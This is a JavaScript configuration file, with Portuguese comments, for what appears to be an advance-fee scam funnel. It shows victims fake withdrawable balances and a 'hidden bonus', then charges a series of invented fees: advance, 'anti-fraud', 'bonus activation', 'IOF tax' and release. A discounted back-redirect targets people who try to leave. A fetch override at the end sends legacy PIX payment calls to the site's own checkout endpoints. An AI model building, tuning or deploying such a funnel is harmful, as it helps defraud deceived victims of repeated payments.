// ============================================================
//  CONFIGURAÇÃO — /funil/link.js
//  Altere os links e valores abaixo. Ao guardar, tudo muda
//  automaticamente no frontend de cada página.
// ============================================================

// ── FRONT PRINCIPAL (confirmar-saque) ───────────────────────
window.__FUNIL_REDIRECT_LINK  = "/checkout.html";
window.__FUNIL_FEE_FRONT      = 12.97;   // taxa exibida (€ 12,97)

// ── BACK-REDIRECT (quem tentou sair) ────────────────────────
window.__FUNIL_REDIRECT_BACK  = "/checkout.html";
window.__FUNIL_FEE_BACK       = 16.66;   // taxa com desconto (€ 16,63)

// ── UPSELL 1 — Antecipação de saque ─────────────────────────
window.__FUNIL_REDIRECT_UPSELL_1  = "/up1";
window.__FUNIL_AMOUNT_SAQUE_1     = 2800;    // valor do saque base (€ 2.800,00)
window.__FUNIL_FEE_1              = 28.74;   // taxa de antecipação (€ 28,74)

// ── UPSELL 2 — Taxa anti-fraude ──────────────────────────────
window.__FUNIL_REDIRECT_UPSELL_2  = "/up2";
window.__FUNIL_AMOUNT_SAQUE_2     = 2847.93; // valor do saque (€ 2.847,93)
window.__FUNIL_FEE_2              = 21.90;   // taxa anti-fraude (€ 21,90)

// ── UPSELL 3 — Ativação de bônus ─────────────────────────────
window.__FUNIL_REDIRECT_UPSELL_3  = "/up3";
window.__FUNIL_AMOUNT_BASE_3      = 2848;    // saldo base (antes do bônus)
window.__FUNIL_AMOUNT_SALDO_3     = 4500;    // novo saldo (após bônus)
window.__FUNIL_FEE_3              = 29.90;   // taxa de ativação (€ 29,90)

// ── UPSELL 4 — IOF (imposto) ──────────────────────────────────
window.__FUNIL_REDIRECT_UPSELL_4  = "/up4";
window.__FUNIL_AMOUNT_GANHO_4     = 4500;    // valor ganho (€ 4.500,00)
window.__FUNIL_FEE_4              = 28.97;   // IOF a pagar (€ 28,97)

// ── UPSELL 5 — Bônus oculto ───────────────────────────────────
window.__FUNIL_REDIRECT_UPSELL_5  = "/up5";
window.__FUNIL_AMOUNT_SALDO_5     = 4500;    // saldo anterior (€ 4.500,00)
window.__FUNIL_AMOUNT_BONUS_5     = 1247.63; // bônus oculto (€ 1.247,63)
window.__FUNIL_FEE_5              = 34.90;   // taxa para liberar (€ 34,90)

// Bridge: SPA legado (create-pix/check-pix) -> checkout.html /api/create-transaction
(function() {
  if (window.__FUNIL_CHECKOUT_BRIDGE_ACTIVE) return;
  window.__FUNIL_CHECKOUT_BRIDGE_ACTIVE = true;

  var originalFetch = window.fetch;
  if (typeof originalFetch !== 'function') return;

  function safeJsonParse(text) {
    try { return JSON.parse(text); } catch (e) { return null; }
  }

  function normalizeCustomer(body) {
    var c = body && typeof body.customer === 'object' ? body.customer : {};
    var fallback = body && typeof body.customerData === 'object' ? body.customerData : {};
    return {
      name: c.name || c.payerName || fallback.name || 'Cliente',
      phone: c.phone || c.number || c.mbway || fallback.phone || fallback.number || '',
      email: c.email || fallback.email || null,
      document: null
    };
  }

  window.fetch = function(url, opts) {
    var nextUrl = url;
    var nextOpts = opts || {};
    var originalUrl = typeof url === 'string' ? url : '';
    var method = (nextOpts.method || 'GET').toUpperCase();

    if (method === 'POST' && originalUrl.indexOf('create-pix') !== -1) {
      var body = safeJsonParse(nextOpts.body || '{}') || {};
      var amountCents = Number(body.amount_cents || body.amountInCents || 0);
      var payload = {
        amount_cents: amountCents,
        customer: normalizeCustomer(body),
        utm_source: body.utm_source || '',
        preserved_query: body.preserved_query || ''
      };
      nextUrl = '/api/checkout';
      nextOpts = Object.assign({}, nextOpts, { body: JSON.stringify(payload) });
    }

    if (method === 'POST' && originalUrl.indexOf('check-pix') !== -1) {
      var checkBody = safeJsonParse(nextOpts.body || '{}') || {};
      var tx = checkBody.transaction_id || checkBody.id || '';
      nextUrl = '/api/create-transaction?action=status';
      nextOpts = Object.assign({}, nextOpts, { body: JSON.stringify({ id: tx }) });
    }

    return originalFetch.call(this, nextUrl, nextOpts).then(function(res) {
      // Mantem compatibilidade: check-pix antigo esperava {status, transaction_id}
      if (method === 'POST' && originalUrl.indexOf('check-pix') !== -1 && res && res.ok) {
        return res.clone().text().then(function(text) {
          var parsed = safeJsonParse(text) || {};
          if (typeof parsed.status === 'string' && parsed.transaction_id) {
            return res;
          }
          var mapped = {
            status: parsed.status || 'pending',
            transaction_id: parsed.transaction_id || ((safeJsonParse(nextOpts.body || '{}') || {}).id || '')
          };
          return new Response(JSON.stringify(mapped), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          });
        }).catch(function() {
          return res;
        });
      }
      return res;
    });
  };
})();
